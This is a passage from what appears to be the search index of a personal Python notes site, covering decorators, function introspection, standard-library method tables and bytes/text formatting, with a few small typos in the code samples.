Serializer:\n    def __init__(self,dict_values):\n        self.values = dict_values\n\n\n    def serialize(self,object):\n        return [ trans(getattr(object,field))for field,trans in self.values.items()]\n\n\n\n\nclass Serialize:\n\n    def __init__(self,**trans) -&gt; None:\n        self.serializer = Serializer(trans)\n\n\n    def __call__(self,object):\n        print(object) ## Event\n\n        def wrapper(instance):# Intance\n            return self.serializer.serialize(instance)\n\n        object.serialize=wrapper\n\n        return object\n\n\n\ndef serialize(**trans):\n    serializer = Serializer(trans)\n    def wrapper(class_obj):\n        def inner(instance):\n            return  serializer.serialize(instance)\n        class_obj.serialize=inner\n        return class_obj\n    return wrapper\n\n\n\n\n@serialize(username=str,password=str,ip=str)\n@dataclass\nclass Event:\n    username:int\n    password:int\n    ip:int\n\n\nx=Event(11,33,444)\n\nprint(x.serialize())\n</code></pre>"},{"location":"python/decorators/decorators/#wrapper-coroutines","title":"wrapper coroutines","text":"<pre><code>import inspect\ndef timing(callable):\n  @wraps(callable)\n  def wrapped(*args, **kwargs):\n    start = time.time()\n    result = callable(*args, **kwargs)\n    latency = time.time() - start\n    return {\"latency\": latency, \"result\": result}\n  @wraps(callable)\n  async def wrapped_coro(*args, **kwargs):\n    start = time.time()\n    result = await callable(*args, **kwargs)\n    latency = time.time() - start\n    return {\"latency\": latency, \"result\": result}\n  if inspect.iscoroutinefunction(callable):\n  return wrapped_coro\nreturn wrapped\n</code></pre>"},{"location":"python/decorators/decorators/#extended-syntax-for-decorators","title":"extended syntax for decorators","text":"<pre><code>def _log(f, *args, **kwargs):\n    print(f\"calling {f.__qualname__!r} with {args=} and {kwargs=}\")\n    return f(*args, **kwargs)\n\n@(lambda f: lambda *args, **kwargs: _log(f, *args, **kwargs))\ndef func(x):\n  return x + 1\n</code></pre>"},{"location":"python/decorators/decorators/#same-decorator-for-function-and-class","title":"same decorator for function and class","text":"<pre><code>from functools import wraps\n\nfrom types import MethodType\n\n\nclass inject_db_driver:\n\n    def __init__(self,function):\n        self.function = function\n        wraps(self.function)(self)\n\n\n    def __call__(self,dbstring):\n        print(dbstring)\n        return self.function(lambda dbstring: dbstring)\n\n    def __get__(self, instance,owner):\n        print(\"dd\")\n        if instance is None:\n            return self\n\n        print(MethodType(self.function,instance))\n\n        return self.__class__(MethodType(self.function,instance))\n\n\n@inject_db_driver\ndef run_query(driver):\n    return \"test\"\n\n\nclass DataHandler:\n    @inject_db_driver\n    def run_query(self,driver):\n        return \"test\"\n\n\n# run_query(\"dato\")\n\nx=DataHandler()\nx.run_query(\"dato\")\n</code></pre>"},{"location":"python/decorators/decorators/#composition-over-inheritance","title":"composition over inheritance","text":"<pre><code>from dataclasses import dataclass\nclass BaseResolverMixin:\n    def __getattr__(self, attr: str):\n        if attr.startswith(\"resolve_\"):\n            *_, actual_attr = attr.partition(\"resolve_\")\n        else:\n            actual_attr = attr\n        try:\n            return self.__dict__[actual_attr]\n        except KeyError as e:\n            raise AttributeError from e\n@dataclass\nclass Customer(BaseResolverMixin):\n    customer_id: str\n    name: str\n    address: str\n\n\n\n\n#######\n\ndef _resolver_method(self, attr):\n    if attr.startswith(\"resolve_\"):\n        *_, actual_attr = attr.partition(\"resolve_\")\n    else:\n        actual_attr = attr\n    try:\n        return self.__dict__[actual_attr]\n    except KeyError as e:\n        raise AttributeError from e\n\n\n\ndef with_resolver(cls):\n    cls.__getattr__=_resolver_method\n    return cls\n\n\n@dataclass\n@with_resolver\nclass Customer(BaseResolverMixin):\n    customer_id: str\n    name: str\n    address: str\n</code></pre>"},{"location":"python/functions/","title":"Functions","text":""},{"location":"python/functions/#recursion","title":"RECURSION","text":"<p>current limit sys.getrecursionlimit() default is 1000 set limit sys.setrecursionlimit()</p>"},{"location":"python/functions/#lambda-functions","title":"LAMBDA FUNCTIONS","text":"<p><pre><code>x = 2\nf = lambda y: x * y\nx = 3\ng = lambda y: x * y\n</code></pre> print(f(10))       # --&gt; prints 30 print(g(10))       # --&gt; prints 30</p>"},{"location":"python/functions/#todo-late-binding","title":"TODO late binding","text":""},{"location":"python/functions/#inner-functions","title":"INNER FUNCTIONS","text":"<p>nonlocal cannot be used to refer to a global variable\u2014it must reference a local variable in an outer scope. Thus, if a function is assigning to a global, you should still use the global declaration</p> <p>Use of nested functions and nonlocal declarations is not a common programming style. For example, inner functions have no outside visibility, which can complicate testing and debugging. Nevertheless, nested functions are sometimes useful for breaking</p>"},{"location":"python/functions/#inspection","title":"INSPECTION","text":"<pre><code>f.__name__\nFunction name\nf.__qualname__\nFully qualified name (if nested)\nf.__module__\nName of module in which defined\nf.__doc__\nDocumentation string\nf.__annotations__\nType hints\nf.__globals__\nDictionary that is the global namespace\nf.__closure__\nClosure variables (if any)\nf.__code__\n</code></pre>"},{"location":"python/functions/#check-function-parameters","title":"CHECK  FUNCTION PARAMETERS","text":"<pre><code>import inspect\ndef func(x: int, y:float, debug=False) -&gt; float:\n    pass\nsig = inspect.signature(func)\nassert inspect.signature(func1) == inspect.signature(func2)\n</code></pre>"},{"location":"python/functions/#get-current-frame-locals","title":"GET CURRENT FRAME LOCALS","text":"<pre><code>def spam(x, y):\n    z = x + y\n    grok(z)\ndef grok(a):\n    b = a * 10\n    # outputs: {'a':5, 'b':50 }\n    print(inspect.currentframe().f_locals)\n</code></pre> <pre><code>f.f_back\nPrevious stack frame (toward the caller)\nf.f_code\nCode object being executed\nf.f_locals\nDictionary of local variables (locals())\nf.f_globals\nDictionary used for global variables (globals())\nf.f_builtins\nDictionary used for built-in names\nf.f_lineno\nLine number\nf.f_lasti\nCurrent instruction. This is an index into the bytecode string of f_code.\nf.f_trace\nFunction called at start of each source code line\n</code></pre>"},{"location":"python/modules/builtins/","title":"Tables Extracted from Python Built-ins and Standard Library Documentation","text":""},{"location":"python/modules/builtins/#table-101-operations-on-bytes-and-bytearrays","title":"Table 10.1: Operations on Bytes and Bytearrays","text":"Operation Description <code>s + t</code> Concatenates if <code>t</code> is bytes. <code>s * n</code> Replicates if <code>n</code> is an integer. <code>s % x</code> Formats bytes. <code>x</code> is tuple. <code>s[i]</code> Returns element <code>i</code> as an integer. <code>s[i:j]</code> Returns a slice. <code>s[i:j:stride]</code> Returns an extended slice. <code>len(s)</code> Number of bytes in <code>s</code>. <code>s.capitalize()</code> Capitalizes the first character. <code>s.center(width [, pad])</code> Centers the string in a field of length <code>width</code>. <code>s.count(sub [, start [, end]])</code> Counts occurrences of the specified substring <code>sub</code>. <code>s.decode([encoding [, errors]])</code> Decodes a byte string into text (bytes type only). <code>s.endswith(suffix [, start [, end]])</code> Checks the end of the string for a suffix. <code>s.expandtabs([tabsize])</code> Replaces tabs with spaces. <code>s.find(sub [, start [, end]])</code> Finds the first occurrence of <code>sub</code>. <code>s.hex()</code> Converts to a hexadecimal string. <code>s.index(sub [, start [, end]])</code> Finds the first occurrence or error of <code>sub</code>. <code>s.isalnum()</code> Checks if all characters are alphanumeric. <code>s.isalpha()</code> Checks if all characters are alphabetic. <code>s.isascii()</code> Checks if all characters are ASCII. <code>s.isdigit()</code> Checks if all characters are digits. <code>s.islower()</code> Checks if all characters are lowercase. <code>s.isspace()</code> Checks if all characters are whitespace. <code>s.istitle()</code> Checks if the string is title-cased. <code>s.isupper()</code> Checks if all characters are uppercase. <code>s.join(t)</code> Joins a sequence of strings <code>t</code> using delimiter <code>s</code>. <code>s.ljust(width [, fill])</code> Left-aligns <code>s</code> in field of <code>width</code>. <code>s.lower()</code> Converts to lowercase. <code>s.lstrip([chrs])</code> Removes leading whitespace or specified characters. <code>s.maketrans(x [, y [, z]])</code> Makes translation table for <code>s.translate()</code>. <code>s.partition(sep)</code> Partitions based on <code>sep</code>; returns tuple <code>(head, sep, tail)</code>. <code>s.removeprefix(prefix)</code> Removes prefix if present. <code>s.removesuffix(suffix)</code> Removes suffix if present. <code>s.replace(old, new [, maxreplace])</code> Replaces substring occurrences. <code>s.rfind(sub [, start [, end]])</code> Finds last occurrence of <code>sub</code>. <code>s.rindex(sub [, start [, end]])</code> Last occurrence or raises error. <code>s.rjust(width [, fill])</code> Right-aligns <code>s</code> in field of <code>width</code>. <code>s.rpartition(sep)</code> Partitions <code>s</code> from the end based on <code>sep</code>. <code>s.rsplit([sep [, maxsplit]])</code> Splits string from right with delimiter <code>sep</code>. <code>s.rstrip([chrs])</code> Removes trailing whitespace or specified characters. <code>s.split([sep [, maxsplit]])</code> Splits string using delimiter <code>sep</code>. <code>s.splitlines([keepends])</code> Splits string into list of lines. <code>s.startswith(prefix [, start [, end]])</code> Checks if string starts with <code>prefix</code>. <code>s.strip([chrs])</code> Removes leading and trailing whitespace/characters. <code>s.swapcase()</code> Swaps case of characters in string. <code>s.title()</code> Returns title-cased version of string. <code>s.translate(table [, deletechars])</code> Translates string using table, removing <code>deletechars</code>. <code>s.upper()</code> Converts string to uppercase. <code>s.zfill(width)</code> Pads string on left with zeros up to <code>width</code>."},{"location":"python/modules/builtins/#table-102-additional-operations-on-byte-arrays","title":"Table 10.2: Additional Operations on Byte Arrays","text":"Operation Description <code>s[i] = v</code> Item assignment. <code>s[i:j] = t</code> Slice assignment. <code>s[i:j:stride] = t</code> Extended slice assignment. <code>del s[i]</code> Item deletion. <code>del s[i:j]</code> Slice deletion. <code>del s[i:j:stride]</code> Extended slice deletion. <code>s.append(x)</code> Appends a new byte to the end. <code>s.clear()</code> Clears the byte array. <code>s.copy()</code> Makes a copy. <code>s.extend(t)</code> Extends <code>s</code> with bytes from <code>t</code>. <code>s.insert(n, x)</code> Inserts byte <code>x</code> at index <code>n</code>. <code>s.pop([n])</code> Removes and returns byte at index <code>n</code>. <code>s.remove(x)</code> Removes first occurrence of byte <code>x</code>. <code>s.reverse()</code> Reverses the byte array in-place."},{"location":"python/modules/builtins/#table-104-operations-on-dictionaries","title":"Table 10.4: Operations on Dictionaries","text":"Operation Description <code>m | n</code> Merges dictionaries <code>m</code> and <code>n</code>. <code>len(m)</code> Returns the number of items in <code>m</code>. <code>m[k]</code> Returns the item of <code>m</code> with key <code>k</code>. <code>m[k] = x</code> Sets item <code>k</code> in <code>m</code> to <code>x</code>. <code>del m[k]</code> Removes key <code>k</code> and its value from <code>m</code>. <code>k in m</code> Checks if <code>k</code> is a key in <code>m</code>. <code>m.clear()</code> Removes all items from <code>m</code>. <code>m.copy()</code> Makes a shallow copy of <code>m</code>. <code>m.fromkeys(s [, value])</code> Creates new dict with keys from <code>s</code>, all values set to <code>value</code>. <code>m.get(k [, v])</code> Returns <code>m[k]</code> if exists; otherwise returns <code>v</code>. <code>m.items()</code> Returns an iterable of <code>(key, value)</code> pairs in <code>m</code>. <code>m.keys()</code> Returns an iterable of keys in <code>m</code>. <code>m.pop(k [, default])</code> Removes key <code>k</code> and returns its value, or <code>default</code>. <code>m.popitem()</code> Removes and returns an arbitrary <code>(key, value)</code> pair. <code>m.setdefault(k [, v])</code> Returns <code>m[k]</code> if exists; otherwise sets <code>m[k] = v</code> and returns <code>v</code>. <code>m.update(b)</code> Updates <code>m</code> with key/value pairs from mapping <code>b</code>. <code>m.values()</code> Returns an iterable of values in <code>m</code>."},{"location":"python/modules/builtins/#table-108-set-operations-and-methods","title":"Table 10.8: Set Operations and Methods","text":"Operation Description <code>s | t</code> Union of sets <code>s</code> and <code>t</code>. <code>s &amp; t</code> Intersection of <code>s</code> and <code>t</code>. <code>s - t</code> Difference of <code>s</code> and <code>t</code>. <code>s ^ t</code> Symmetric difference of <code>s</code> and <code>t</code>. <code>len(s)</code> Number of items in set <code>s</code>. <code>s.add(item)</code> Adds <code>item</code> to set <code>s</code>. <code>s.clear()</code> Removes all items from <code>s</code>. <code>s.copy()</code> Returns a shallow copy of <code>s</code>. <code>s.difference(t)</code> Items in <code>s</code> not in <code>t</code>. <code>s.difference_update(t)</code> Removes items in both <code>s</code> and <code>t</code> from <code>s</code>. <code>s.discard(item)</code> Removes <code>item</code> from <code>s</code> if present. <code>s.intersection(t)</code> Items common to <code>s</code> and <code>t</code>. <code>s.intersection_update(t)</code> Updates <code>s</code> with items common to <code>s</code> and <code>t</code>. <code>s.isdisjoint(t)</code> True if <code>s</code> and <code>t</code> share no items. <code>s.issubset(t)</code> True if all items of <code>s</code> are in <code>t</code>. <code>s.issuperset(t)</code> True if all items of <code>t</code> are in <code>s</code>. <code>s.pop()</code> Removes and returns an arbitrary item from <code>s</code>. <code>s.remove(item)</code> Removes <code>item</code> from <code>s</code> or raises KeyError. <code>s.symmetric_difference(t)</code> Items in either <code>s</code> or <code>t</code> but not both. <code>s.symmetric_difference_update(t)</code> Updates <code>s</code> to symmetric difference of <code>s</code> and <code>t</code>. <code>s.union(t)</code> Returns union of <code>s</code> and <code>t</code>. <code>s.update(t)</code> Adds items from <code>t</code> to <code>s</code>."},{"location":"python/modules/builtins/#table-109-string-operators-and-methods","title":"Table 10.9: String Operators and Methods","text":"Operation Description <code>s + t</code> Concatenates <code>s</code> and <code>t</code> if <code>t</code> is a string. <code>s * n</code> Replicates string <code>s</code> <code>n</code> times. <code>s % x</code> Formats string using tuple <code>x</code>. <code>s[i]</code> Returns character at index <code>i</code>. <code>s[i:j]</code> Returns substring from index <code>i</code> to <code>j</code>. <code>s[i:j:stride]</code> Returns substring with steps. <code>len(s)</code> Returns length of string <code>s</code>. <code>s.capitalize()</code> Capitalizes first character of <code>s</code>. <code>s.casefold()</code> Returns caseless version of <code>s</code> for comparisons. <code>s.center(width [, pad])</code> Centers <code>s</code> in field of <code>width</code>, padded by <code>pad</code>. <code>s.count(sub [, start [, end]])</code> Counts occurrences of substring <code>sub</code>. <code>s.decode([encoding [, errors]])</code> Decodes byte string into text (for bytes). <code>s.encode([encoding [, errors]])</code> Encodes string using specified encoding. <code>s.endswith(suffix [, start [, end]])</code> Checks if <code>s</code> ends with <code>suffix</code>. <code>s.expandtabs([tabsize])</code> Replaces tabs in <code>s</code> with spaces. <code>s.find(sub [, start [, end]])</code> Finds first index of <code>sub</code> in <code>s</code>. <code>s.format(args, *kwargs)</code> Formats string using positional and keyword arguments. <code>s.format_map(m)</code> Formats string using mapping <code>m</code>. <code>s.index(sub [, start [, end]])</code> Like <code>find()</code> but raises error if not found. <code>s.isalnum()</code> Checks if all characters in <code>s</code> are alphanumeric. <code>s.isalpha()</code> Checks if all characters in <code>s</code> are alphabetic. <code>s.isascii()</code> Checks if all characters in <code>s</code> are ASCII. <code>s.isdecimal()</code> Checks if all characters in <code>s</code> are decimal characters. <code>s.isdigit()</code> Checks if all characters in <code>s</code> are digits. <code>s.isidentifier()</code> Checks if <code>s</code> is a valid identifier. <code>s.islower()</code> Checks if all characters in <code>s</code> are lowercase. <code>s.isnumeric()</code> Checks if all characters in <code>s</code> are numeric. <code>s.isprintable()</code> Checks if all characters in <code>s</code> are printable. <code>s.isspace()</code> Checks if all characters in <code>s</code> are whitespace. <code>s.istitle()</code> Checks if <code>s</code> is title-cased. <code>s.isupper()</code> Checks if all characters in <code>s</code> are uppercase. <code>s.join(t)</code> Joins sequence <code>t</code> with delimiter <code>s</code>. <code>s.ljust(width [, fill])</code> Left-justifies <code>s</code> in field of width <code>width</code>. <code>s.lower()</code> Converts <code>s</code> to lowercase. <code>s.lstrip([chrs])</code> Removes leading characters specified in <code>chrs</code> from <code>s</code>. <code>s.maketrans(x [, y [, z]])</code> Creates a translation table for substitutions. <code>s.partition(sep)</code> Splits <code>s</code> into tuple <code>(head, sep, tail)</code> at first occurrence of <code>sep</code>. <code>s.removeprefix(prefix)</code> Removes prefix <code>prefix</code> from <code>s</code> if present. <code>s.removesuffix(suffix)</code> Removes suffix <code>suffix</code> from <code>s</code> if present. <code>s.replace(old, new [, maxreplace])</code> Replaces occurrences of <code>old</code> with <code>new</code> in <code>s</code>. <code>s.rfind(sub [, start [, end]])</code> Finds last index of <code>sub</code> in <code>s</code>. <code>s.rindex(sub [, start [, end]])</code> Like <code>rfind()</code> but raises error if not found. <code>s.rjust(width [, fill])</code> Right-justifies <code>s</code> in field of width <code>width</code>. <code>s.rpartition(sep)</code> Splits <code>s</code> into tuple <code>(head, sep, tail)</code> at last occurrence of <code>sep</code>. <code>s.rsplit([sep [, maxsplit]])</code> Splits <code>s</code> from right using separator <code>sep</code>. <code>s.rstrip([chrs])</code> Removes trailing characters specified in <code>chrs</code> from <code>s</code>. <code>s.split([sep [, maxsplit]])</code> Splits <code>s</code> using separator <code>sep</code>. <code>s.splitlines([keepends])</code> Splits <code>s</code> into list of lines. <code>s.startswith(prefix [, start [, end]])</code> Checks if <code>s</code> starts with <code>prefix</code>. <code>s.strip([chrs])</code> Removes leading and trailing characters <code>chrs</code> from <code>s</code>. <code>s.swapcase()</code> Swaps case of letters in <code>s</code>. <code>s.title()</code> Converts <code>s</code> to title case. <code>s.translate(table [, deletechars])</code> Translates characters in <code>s</code> using table. <code>s.upper()</code> Converts <code>s</code> to uppercase. <code>s.zfill(width)</code> Pads <code>s</code> on left with zeros to fill width."},{"location":"python/modules/builtins/#table-1010-tuple-operators-and-methods","title":"Table 10.10: Tuple Operators and Methods","text":"Operation Description <code>s + t</code> Concatenates tuples if <code>t</code> is a tuple. <code>s * n</code> Replicates tuple <code>s</code> <code>n</code> times. <code>s[i]</code> Returns element at index <code>i</code> of tuple <code>s</code>. <code>s[i:j]</code> Returns a slice of tuple <code>s</code> from index <code>i</code> to <code>j</code>. <code>s[i:j:stride]</code> Returns an extended slice of tuple <code>s</code>. <code>len(s)</code> Number of elements in tuple <code>s</code>. <code>s.count(x)</code> Counts occurrences of element <code>x</code> in tuple <code>s</code>. <code>s.index(x [, start [, stop]])</code> Returns first index of <code>x</code> in <code>s</code> (optionally within [start, stop])."},{"location":"python/modules/builtins/#additional-built-in-python-libraries-and-their-usage","title":"Additional Built-in Python Libraries and Their Usage","text":"<p>The Python Standard Library offers a wealth of modules beyond built-in types and functions. Here is a brief table summarizing additional useful libraries, along with a short description of their usage:</p> Module Description Common Usage Examples <code>collections</code> Specialized container datatypes <code>deque</code>, <code>Counter</code>, <code>defaultdict</code>, <code>OrderedDict</code> <code>datetime</code> Basic date and time types Creating date/time objects, arithmetic on dates <code>itertools</code> Functions creating iterators for efficient looping <code>chain</code>, <code>cycle</code>, <code>product</code>, <code>permutations</code>, <code>combinations</code> <code>inspect</code> Inspect live objects Getting function signatures, source code introspection <code>math</code> Mathematical functions <code>sqrt</code>, <code>sin</code>, <code>cos</code>, constants like <code>pi</code>, <code>e</code> <code>os</code> Miscellaneous operating system interfaces File/directory operations, environment variables <code>random</code> Generate pseudo-random numbers <code>random()</code>, <code>randint()</code>, shuffling sequences <code>re</code> Regular expressions Pattern matching, search and replace text <code>shutil</code> High-level file operations Copying files/dirs, archiving directories <code>statistics</code> Mathematical statistics functions <code>mean</code>, <code>median</code>, <code>stdev</code> <code>sys</code> System-specific parameters and functions Command-line arguments (<code>sys.argv</code>), exit codes, stderr <code>time</code> Time access and conversions <code>sleep()</code>, <code>time()</code>, performance counters <code>turtle</code> Turtle graphics for simple drawing Educational graphics programming <code>unittest</code> Unit testing framework Writing and running tests, test discovery <p>These modules extend Python's capabilities and are essential tools for many programming tasks.</p>"},{"location":"python/modules/builtins/#comprehensive-tables-for-python-standard-library-modules","title":"Comprehensive Tables for Python Standard Library Modules","text":"<p>Below are refined tables for several Python standard library modules, summarizing their primary classes, functions, and methods. For exhaustive details, refer to the official Python documentation for each module.</p>"},{"location":"python/modules/builtins/#collections-module-main-classes-and-methods","title":"<code>collections</code> Module: Main Classes and Methods","text":"Class/Function Description Key Methods/Attributes <code>deque</code> Double-ended queue <code>append()</code>, <code>appendleft()</code>, <code>pop()</code>, <code>popleft()</code>, <code>extend()</code>, <code>extendleft()</code>, <code>rotate()</code>, <code>clear()</code>, <code>index()</code>, <code>insert()</code>, <code>remove()</code> <code>Counter</code> Counts hashable objects <code>elements()</code>, <code>most_common()</code>, <code>subtract()</code>, <code>update()</code> <code>defaultdict</code> Dict with default values Inherits dict methods; uses a factory function for missing keys <code>OrderedDict</code> Dict with order memory All dict methods, plus <code>move_to_end()</code>, <code>popitem(last=True)</code>"},{"location":"python/modules/builtins/#datetime-module-key-classes-and-methods","title":"<code>datetime</code> Module: Key Classes and Methods","text":"Class Description Key Methods/Attributes <code>date</code> Represents a date (year, month, day) <code>today()</code>, <code>fromtimestamp()</code>, <code>isoformat()</code>, <code>weekday()</code>, <code>strftime()</code> <code>time</code> Represents a time <code>isoformat()</code>, <code>strftime()</code>, comparison operators <code>datetime</code> Combines date and time <code>now()</code>, <code>utcnow()</code>, <code>fromtimestamp()</code>, <code>combine()</code>, <code>strftime()</code>, <code>date()</code>, <code>time()</code>, arithmetic <code>timedelta</code> Duration between dates/times Attributes: <code>days</code>, <code>seconds</code>, <code>microseconds</code>; supports arithmetic operations"},{"location":"python/modules/builtins/#itertools-module-main-functions","title":"<code>itertools</code> Module: Main Functions","text":"Function Description Example Usage <code>chain(*iterables)</code> Concatenates multiple iterables <code>chain([1,2], [3,4])</code> -&gt; 1,2,3,4 <code>cycle(iterable)</code> Repeats an iterable indefinitely <code>cycle('AB')</code> -&gt; A, B, A, B, ... <code>product(*iterables, repeat=1)</code> Cartesian product of iterables <code>product([1,2], repeat=2)</code> -&gt; (1,1), (1,2)... <code>permutations(iterable, r=None)</code> All possible orderings of length r <code>permutations([1,2,3], 2)</code> <code>combinations(iterable, r)</code> All possible r-length combinations <code>combinations('ABCD', 2)</code> <code>combinations_with_replacement(iterable, r)</code> Combinations with replacement <code>combinations_with_replacement('AB', 2)</code>"},{"location":"python/modules/builtins/#inspect-module-main-functions","title":"<code>inspect</code> Module: Main Functions","text":"Function Description <code>getmembers(object, predicate=None)</code> Returns all members of an object, optionally filtered. <code>signature(callable)</code> Returns a Signature object for the callable. <code>ismodule(obj)</code>, <code>isfunction(obj)</code>, <code>isclass(obj)</code> Checks object type. <code>getsource(object)</code> Returns the source code of the object. <code>getdoc(object)</code> Returns the documentation string for the object."},{"location":"python/modules/builtins/#math-module-key-functions-and-constants","title":"<code>math</code> Module: Key Functions and Constants","text":"Function/Constant Description <code>sqrt(x)</code> Square root of x. <code>sin(x)</code>, <code>cos(x)</code>, <code>tan(x)</code> Trigonometric functions. <code>log(x[, base])</code> Logarithm of x with specified base. <code>exp(x)</code> Exponential of x. <code>pi</code>, <code>e</code> Mathematical constants \u03c0 and e. <code>floor(x)</code>, <code>ceil(x)</code> Floor and ceiling functions. <code>gcd(a, b)</code> Greatest common divisor of a and b."},{"location":"python/modules/builtins/#os-module-common-functions","title":"<code>os</code> Module: Common Functions","text":"Function Description <code>os.listdir(path)</code> Lists entries in directory <code>path</code>. <code>os.path.join(a, b)</code> Joins one or more path components. <code>os.getcwd()</code> Returns current working directory. <code>os.chdir(path)</code> Changes current working directory to <code>path</code>. <code>os.mkdir(path)</code> Creates a new directory named <code>path</code>. <code>os.remove(path)</code> Removes (deletes) the file <code>path</code>. <code>os.rename(src, dst)</code> Renames file or directory from <code>src</code> to <code>dst</code>. <code>os.environ</code> Mapping of environment variables."},{"location":"python/modules/builtins/#ipaddress-module-main-classes-and-methods","title":"<code>ipaddress</code> Module: Main Classes and Methods","text":"Class Description Key Methods/Attributes <code>IPv4Address(address)</code> Represents an IPv4 address <code>packed</code>, <code>exploded</code>, <code>compressed</code>, <code>is_private</code>, <code>is_global</code> <code>IPv6Address(address)</code> Represents an IPv6 address <code>packed</code>, <code>exploded</code>, <code>compressed</code>, <code>is_private</code>, <code>is_link_local</code> <code>IPv4Network(network)</code> Represents an IPv4 network <code>hosts()</code>, <code>network_address</code>, <code>broadcast_address</code>, <code>with_prefixlen</code> <code>IPv6Network(network)</code> Represents an IPv6 network Similar to <code>IPv4Network</code> methods <code>ip_address(address)</code> Factory for IP address objects Returns IPv4Address or IPv6Address based on input <code>ip_network(address, strict=True)</code> Creates IP network object Accepts CIDR notation; returns appropriate network object"},{"location":"python/modules/builtins/#pathlib-module-main-classes-and-methods","title":"<code>pathlib</code> Module: Main Classes and Methods","text":"Class Description Key Methods/Attributes <code>Path</code> Represents filesystem paths <code>cwd()</code>, <code>home()</code>, <code>exists()</code>, <code>iterdir()</code>, <code>mkdir()</code>, <code>open()</code>, <code>read_text()</code>, <code>write_text()</code>, <code>rglob()</code>, <code>joinpath()</code>"},{"location":"python/modules/builtins/#socket-module-key-classes-and-methods","title":"<code>socket</code> Module: Key Classes and Methods","text":"Class/Function Description <code>socket.socket(family, type)</code> Creates a new socket using specified address family and socket type. <code>socket.connect(address)</code> Connects the socket to a remote address. <code>socket.bind(address)</code> Binds the socket to a local address. <code>socket.listen(backlog)</code> Enables a server to accept connections. <code>socket.accept()</code> Accepts a connection, returning a new socket and address pair. <code>socket.send(bytes)</code> Sends data to the connected remote socket. <code>socket.recv(bufsize)</code> Receives data from the socket. <code>socket.close()</code> Closes the socket."},{"location":"python/modules/builtins/#threading-module-key-classes-and-methods","title":"<code>threading</code> Module: Key Classes and Methods","text":"Class/Function Description <code>threading.Thread(target, args)</code> Creates a new thread to run a target function with arguments. <code>thread.start()</code> Starts thread execution. <code>thread.join(timeout=None)</code> Waits for thread to finish, with optional timeout. <code>threading.Lock()</code> Creates a lock object for thread synchronization. <code>lock.acquire(blocking=True)</code> Acquires the lock. <code>lock.release()</code> Releases the lock. <code>threading.Event()</code> Creates an event object for thread communication. <code>event.set()</code> Sets the event flag. <code>event.clear()</code> Clears the event flag. <code>event.wait(timeout=None)</code> Waits until the event is set or a timeout occurs. <code>threading.Semaphore(value=1)</code> Creates a semaphore to control access to a resource."},{"location":"python/modules/builtins/#multiprocessing-module-key-classes-and-methods","title":"<code>multiprocessing</code> Module: Key Classes and Methods","text":"Class/Function Description <code>multiprocessing.Process(target, args)</code> Creates a new process to run a target function with arguments. <code>process.start()</code> Starts process execution. <code>process.join(timeout=None)</code> Waits for the process to complete, with optional timeout. <code>multiprocessing.Lock()</code> Creates a lock object for process synchronization. <code>multiprocessing.Queue()</code> Creates a queue for inter-process communication. <code>queue.put(item)</code> Puts an item into the queue. <code>queue.get()</code> Retrieves an item from the queue. <code>multiprocessing.Pool(processes)</code> Manages a pool of worker processes. <code>pool.map(func, iterable)</code> Applies a function to items in an iterable across processes."},{"location":"python/modules/builtins/#asyncio-module-key-functions-and-classes","title":"<code>asyncio</code> Module: Key Functions and Classes","text":"Class/Function Description <code>asyncio.run(main())</code> Runs an async main function, managing the event loop lifecycle. <code>asyncio.create_task(coro)</code> Schedules the execution of a coroutine as a task. <code>await asyncio.sleep(seconds)</code> Asynchronously waits for a specified time without blocking the event loop. <code>asyncio.gather(*coros)</code> Runs multiple coroutines concurrently and aggregates results. <code>asyncio.Event()</code> Creates an event for asyncio tasks communication. <code>asyncio.Lock()</code> Creates an asynchronous lock for coroutine synchronization. <code>asyncio.Queue()</code> Creates an asynchronous queue for inter-task communication. <code>asyncio.open_connection(host, port)</code> Opens a network connection, returning reader and writer streams. <p>Note: These tables present key aspects and methods of each module. Each module offers many more features and functions. For comprehensive details, consult the official Python documentation.</p>"},{"location":"python/modules/io/","title":"IO","text":"<p>data representation</p>"},{"location":"python/modules/io/#specify-a-bytes-literal-note-b-prefix","title":"Specify a bytes literal (note: b' prefix)","text":"<p>a = b'hello'</p>"},{"location":"python/modules/io/#specify-bytes-from-a-list-of-integers","title":"Specify bytes from a list of integers","text":"<p>b = bytes([0x68, 0x65, 0x6c, 0x6c, 0x6f])</p>"},{"location":"python/modules/io/#create-and-populate-a-bytearray-from-parts","title":"Create and populate a bytearray from parts","text":"<p>c = bytearray() c.extend(b'world')   # d = 'world' c.append(0x21)       # d = 'world!'</p>"},{"location":"python/modules/io/#access-byte-values","title":"Access byte values","text":"<p>print(a[0])     # --&gt; prints 104</p> <p>for x in b:     # Outputs 104 101 108 108 111    print(x)</p> <p>a = b'hello'     # bytes b = 'hello'      # text c = 'world'      # text</p> <p>print(a == b)    # -&gt; False d = a + c        # TypeError: can't concat str to bytes e = b + c        # -&gt; 'helloworld' (both are strings)</p> <p>text encoding and decoding</p> <p>a = 'hello'             # Text b = a.encode('utf-8')   # Encode to bytes</p> <p>c = b'world'            # Bytes d = c.decode('utf-8')   # Decode to text</p> <p>'ascii'</p> <p>Character values in the range [0x00, 0x7f].</p> <p>'latin1'</p> <p>Character values in the range [0x00, 0xff]. Also known as 'iso-8859-1'.</p> <p>'utf-8'</p> <p>Variable-length encoding that allows all Unicode characters to be represented.</p> <p>'cp1252'</p> <p>A common text encoding on Windows.</p> <p>'macroman'</p> <p>A common text encoding on Macintosh.</p> <p>text and byte formatting</p> <p>x = 123.456 format(x, '0.2f')       # '123.46' format(x, '10.4f')      # '  123.4560' format(x, '&lt;10.2f')    # '123.46***'</p> <p>name = 'Elwood' r = format(name, '&lt;10')     # r = 'Elwood    ' r = format(name, '&gt;10')     # r = '    Elwood' r = format(name, '^10')     # r = '  Elwood  ' r = format(name, '^10')    # r = 'Elwood*'</p> <p>d</p> <p>Decimal integer or long integer.</p> <p>b</p> <p>Binary integer or long integer.</p> <p>o</p> <p>Octal integer or long integer.</p> <p>x</p> <p>Hexadecimal integer or long integer.</p> <p>X</p> <p>Hexadecimal integer (uppercase letters).</p> <p>f, F</p> <p>Floating point as [-]m.dddddd.</p> <p>e</p> <p>Floating point as [-]m.dddddde\u00b1xx.</p> <p>E</p> <p>Floating point as [-]m.ddddddE\u00b1xx.</p> <p>g, G</p> <p>Use e or E for exponents less than [nd]4 or greater than the precision; otherwise use f.</p> <p>n</p> <p>Same as g except that the current locale setting determines the decimal point character.</p> <p>%</p> <p>Multiplies a number by 100 and displays it using f format followed by a % sign.</p> <p>s</p> <p>String or any object. The formatting code uses str() to generate strings.</p> <p>c</p> <p>Single character.</p> <p>x = 42 r = format(x, '10d')        # r = '        42' r = format(x, '10x')        # r = '        2a' r = format(x, '10b')        # r = '    101010' 